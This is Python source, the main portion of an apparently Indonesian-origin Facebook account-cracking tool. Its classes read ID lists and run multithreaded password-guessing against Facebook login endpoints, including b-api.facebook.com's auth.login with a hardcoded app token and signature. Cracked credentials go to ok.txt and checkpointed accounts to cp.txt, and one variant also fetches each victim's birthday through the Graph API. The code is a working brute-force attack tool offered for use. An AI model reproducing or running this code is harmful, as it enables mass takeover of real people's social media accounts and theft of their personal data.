			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK🔥\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP🎭\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\b[0;37mOK🔥\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\🎭b[0;37mCP🎭\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK🔥\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;33m[\x1b[0;37mCP🎭\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()


def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
    print((k+"\n[ "+p+"OK"+k+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" No Result Found"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

def updatesc():
	os.system("clear")
	banner()
	print((k+"\n["+p+"•"+k+"]"+p+" Updating Script"))
	os.system("git pull origin master")
	print((k+"\n["+p+"•"+k+"]"+p+" Update Successful"))
	exit()

def wangsaff():
    os.system("clear")
    banner()
    input("\n[ Contact VivekXD? ]")
    jalan(k+"["+p+"•"+k+"]"+p+" Open Whatsapp...")
    os.system("xdg-open https://wa.me/+17087220306?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20SBF%20Vivek.%20Code:%20404")
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	menu()

